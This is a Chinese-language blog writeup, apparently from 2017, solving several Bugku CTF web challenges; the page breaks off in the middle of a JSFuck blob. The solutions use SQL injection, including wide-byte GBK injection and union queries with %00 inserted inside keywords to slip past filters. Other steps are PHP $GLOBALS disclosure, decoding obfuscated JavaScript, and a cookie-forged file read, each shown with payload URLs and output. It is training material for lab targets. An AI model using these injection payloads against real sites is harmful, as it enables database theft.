@@ -1,0 +1,919 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Bugku部分题目Writeup - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Bugku部分题目Writeup">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2017-10-10 18:08" pubdate>
+        2017年10月10日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      60
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Bugku部分题目Writeup</h1>
+            
+            <div class="markdown-body">
+              <p>持续更新中。。</p>
+<a id="more"></a>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8002/web2/" title="题目地址">题目地址</a></p>
+<p>这题上来一大堆滑稽，特别炫酷。。</p>
+<p>用Burp抓包和firebug审查元素都没找到有用的东西，最后不小心碰了下F12..惊现flag..<br><img src="https://image.mengsec.com/bugku-Web2.png" srcset="/img/loading.gif"><br>告诉自己以后别忘了“右键”-“查看元素”</p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><a target="_blank" rel="noopener" href="http://103.238.227.13:10083/" title="题目地址">题目地址</a><br>首先抓了个包。<br>发现编码方式为GBK，经过测试后为宽字节注入。</p>
+<pre><code>http://103.238.227.13:10083/?id=-1%d5&#39;
+显示：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;-1誠&#39;&#39; LIMIT 1&#39; at line 1
+</code></pre>
+<p>发现注入方法就好办了，直接order by 判断有多少列</p>
+<pre><code>http://103.238.227.13:10083/?id=-1%d5%27 order by 1 --+
+页面正常
+http://103.238.227.13:10083/?id=-1%d5%27 order by 2 --+
+页面正常
+http://103.238.227.13:10083/?id=-1%d5%27 order by 3 --+
+报错：Unknown column &#39;3&#39; in &#39;order clause&#39;
+</code></pre>
+<p>说明数据库有两列<br>然后查询数据库名称</p>
+<pre><code>http://103.238.227.13:10083/?id=-1%d5%27 union select null,database() --+
+显示为sql5
+</code></pre>
+<p>查询sql5的所有表名：</p>
+<pre><code>http://103.238.227.13:10083/?id=-1%d5%27 union select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --+ 
+显示为key,test
+</code></pre>
+<p>查询所有字段名：</p>
+<pre><code>http://103.238.227.13:10083/?id=-1%d5%27 union select null,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() --+
+显示为id,string,id,key
+</code></pre>
+<p>查询字段内容：</p>
+<pre><code>http://103.238.227.13:10083/?id=-1%d5%27 union select 1,group_concat(id,0x7e,string) FROM .key --+
+key    1~54f3320dc261f313ba712eb3f13a1f6d,2~aaaaaaaaaa
+</code></pre>
+<p>根据题目要求：查询key表,id=1的string字段<br>可得string的内容为54f3320dc261f313ba712eb3f13a1f6d</p>
+<p>flag为</p>
+<pre><code>KEY&#123;54f3320dc261f313ba712eb3f13a1f6d&#125;
+</code></pre>
+<h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p><a target="_blank" rel="noopener" href="http://103.238.227.13:10087/" title="题目地址">题目地址</a></p>
+<p>判断列数：</p>
+<pre><code>http://103.238.227.13:10087/?id=1 o%00rder by 1
+正常回显
+http://103.238.227.13:10087/?id=1 o%00rder by 2
+正常回显
+http://103.238.227.13:10087/?id=1 o%00rder by 3
+没有正常回显
+</code></pre>
+<p>确定列数为2</p>
+<p>查询数据库名称</p>
+<pre><code>http://103.238.227.13:10087/?id=1 uni%00on sel%00ect 1,database() --+
+</code></pre>
+<p>数据库名称为sql3<br>然后查询数据库的所有的表名</p>
+<pre><code>http://103.238.227.13:10087/?id=1 un%00ion s%00elect 1,group_concat(tab%00le_name) FR%00OM info%00rmation_schema.t%00ables WHE%00RE ta%00ble_schema=database() --+
+</code></pre>
+<p>返回：hash,key,temp</p>
+<p>然后查询key中的字段hash的内容：</p>
+<pre><code>http://103.238.227.13:10087/?id=1 un%00ion sel%00ect 1,gr%00oup_co%00ncat(id,0x7e,hash) FR%00OM .key --+
+</code></pre>
+<p>返回1~c3d3c17b4ca7f791f85e#$1cc72af274af4adef</p>
+<pre><code>因此hash字段的内容应为c3d3c17b4ca7f791f85e#$1cc72af274af4adef
+</code></pre>
+<p>所以flag为：<br>​<br>    KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef}</p>
+<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8004/index1.php" title="题目地址">题目地址</a></p>
+<pre><code>flag In the variable ! 
+&lt;?php  
+
+error_reporting(0);
+include &quot;flag1.php&quot;;
+highlight_file(__file__);
+if(isset($_GET[&#39;args&#39;]))&#123;
+    $args = $_GET[&#39;args&#39;];
+    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;
+        die(&quot;args error!&quot;);
+    &#125;
+eval(&quot;var_dump($$args);&quot;);
+&#125;
+?&gt;
+</code></pre>
+<p>看样子关键点在</p>
+<pre><code>eval(&quot;var_dump($$args);&quot;);
+</code></pre>
+<p>此处考察了PHP的一个小知识点–超全局变量</p>
+<blockquote>
+<p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。<br>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p>
+</blockquote>
+<p>因此令$args=GLOBALS可以使得</p>
+<pre><code>eval(&quot;var_dump($GLOBALS);&quot;);
+</code></pre>
+<p>从而打印出所有全局变量的值</p>
+<p>Payload:</p>
+<pre><code>http://120.24.86.145:8004/index1.php?args=GLOBALS
+</code></pre>
+<p>回显</p>
+<pre><code>array(7) &#123; [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_GET&quot;]=&gt; array(1) &#123; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;ZFkwe3&quot;]=&gt; string(38) &quot;flag&#123;92853051ab894a64f7865cf3c2128b34&#125;&quot; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; 
+</code></pre>
+<p>因此flag为</p>
+<pre><code>flag&#123;92853051ab894a64f7865cf3c2128b34&#125;
+</code></pre>
+<h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8002/web4/index.php" title="题目地址">题目地址</a></p>
+<p>根据提示右键查看源代码，发现一段JS代码</p>
+<pre><code>&lt;script&gt;
+var p1 = &#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#39;;
+var p2 = &#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#39;;
+eval(unescape(p1) + unescape(&#39;%35%34%61%61%32&#39; + p2));
+&lt;/script&gt;
+</code></pre>
+<p>URL解码得</p>
+<pre><code>var p1 = &#39;function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a)&#123;if(&quot;67d709b2b&#39;;
+var p2 = &#39;aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;&#39;;
+eval(unescape(p1) + unescape(&#39;54aa2&#39; + p2));
+</code></pre>
+<p>虽然没学过JS,但编程语言的思想都差不多。<br>最后执行的语句应该是</p>
+<pre><code>function checkSubmit()
+&#123;
+    var a=document.getElementById(&quot;password&quot;);
+    if(&quot;undefined&quot;!=typeof a)
+    &#123;
+        if(&quot;67d709b2b&#39;+&#39;54aa2&#39;+&#39;aa648cf6e87a7114f1&quot;==a.value)        return!0;
+        alert(&quot;Error&quot;);
+        a.focus();
+        return!1
+    &#125;
+&#125;
+document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;&#39;;
+</code></pre>
+<p>尝试提交”67d709b2b’+’54aa2’+’aa648cf6e87a7114f1”<br>即67d709b2b54aa2aa648cf6e87a7114f1</p>
+<p>获得flag:<br>​<br>    KEY{J22JK-HS11}</p>
+<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8002/chengjidan/" title="题目地址">题目地址</a></p>
+<p>查询成绩，明显是考察SQL注入，经过测试为Post注入。</p>
+<p>有四个查询位而且都有回显。</p>
+<p>查询数据库名称：</p>
+<pre><code>id=-1%27union select database(),2,3,4%23
+
+回显：skctf_flag
+</code></pre>
+<p>查询表名：</p>
+<pre><code>id=-1%27union select table_name,2,3,4 from information_schema.tables where TABLE_SCHEMA=database() LIMIT 0,1%23
+
+回显：fl4g
+</code></pre>
+<p>查询字段名：</p>
+<pre><code>id=-1%27union select column_name,2,3,4 from information_schema.columns where TABLE_SCHEMA=database() and table_name=&#39;fl4g&#39; LIMIT 0,1%23
+
+回显：skctf_flag
+</code></pre>
+<p>查询字段内容：</p>
+<pre><code>id=-1%27union select skctf_flag,2,3,4 from fl4g%23
+
+回显：BUGKU&#123;Sql_INJECT0N_4813drd8hz4&#125;
+</code></pre>
+<p>flag为：<br>​<br>    BUGKU{Sql_INJECT0N_4813drd8hz4}<br>当时校赛这题没做出来。。(╯‵□′)╯︵┻━┻</p>
+<h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8002/web6/" title="题目地址">题目地址</a></p>
+<p>右键查看网页源代码：<br>​<br>    <!-- OK ,now you have to post the margin what you find --><br>没别的东西，抓包试一下。发现在响应包中返回了一个flag参数，而且每次都会变。<br>比如：</p>
+<pre><code>flag: 6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogT0RFeU5EQTQ=
+</code></pre>
+<p>解码后：</p>
+<pre><code>跑的还不错，给你flag吧: ODEyNDA4
+</code></pre>
+<p>再次解码：</p>
+<pre><code>812408
+</code></pre>
+<p>根据提示提交每次解码后获得的margin参数来获取flag。写脚本：<br>​<br>    #-<em>-coding:utf-8-</em>-</p>
+<pre><code>import requests
+import base64
+
+url = &quot;http://120.24.86.145:8002/web6/&quot;
+r = requests.session()
+
+headers = r.get(url).headers
+x = base64.b64decode(headers[&#39;flag&#39;]).split(&#39;:&#39;)
+key = base64.b64decode(x[1])
+
+data = &#123;&#39;margin&#39;:key&#125;
+re = r.post(url = url, data = data).content
+
+print (re)
+</code></pre>
+<p>flag为</p>
+<pre><code>KEY&#123;111dd62fcd377076be18a&#125;
+</code></pre>
+<h2 id="cookies欺骗？？"><a href="#cookies欺骗？？" class="headerlink" title="cookies欺骗？？"></a>cookies欺骗？？</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8002/web11/" title="题目地址">题目地址</a></p>
+<p>访问后url变成：</p>
+<pre><code>http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=
+</code></pre>
+<p>filename参数解一下码</p>
+<pre><code>a2V5cy50eHQ=  --&gt; key.txt
+</code></pre>
+<p>于是乎：</p>
+<pre><code>index.php --&gt; aW5kZXgucGhw
+</code></pre>
+<p>访问:</p>
+<pre><code>http://120.24.86.145:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw
+</code></pre>
+<p>源代码中有&lt;?php,<br>line参数是指的回显代码的行数，写个脚本遍历一下。</p>
+<pre><code>#-*-coding:utf-8-*-
+
+import requests
+
+for i in range(50):
+url = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;+str(i)+&quot;&amp;filename=aW5kZXgucGhw&quot;
+r = requests.get(url).content
+print(r),
+</code></pre>
+<p>获得的源代码为：</p>
+<pre><code>&lt;?php
+error_reporting(0);
+$file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);
+$line=isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;
+if($file==&#39;&#39;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);
+$file_list = array(
+&#39;0&#39; =&gt;&#39;keys.txt&#39;,
+&#39;1&#39; =&gt;&#39;index.php&#39;,
+);
+if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)&#123;
+    $file_list[2]=&#39;keys.php&#39;;
+&#125;
+if(in_array($file, $file_list))&#123;
+    $fa = file($file);
+    echo $fa[$line];
+&#125;
+
+?&gt;
+</code></pre>
+<p>审计代码可知：<br>​<br>    构造cookie为：<br>    Cookie: margin=margin<br>然后读取key.php的值<br>​<br>    <?php $key='KEY{key_keys}'; ?><br>flag为：</p>
+<pre><code>KEY&#123;key_keys&#125;
+</code></pre>
+<h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p><a target="_blank" rel="noopener" href="http://120.24.86.145:8002/web5/" title="题目地址">题目地址</a></p>
+<p>右键查看源代码。。JSfuck代码，直接扔控制台里执行。</p>
+<pre><code>([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]])+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+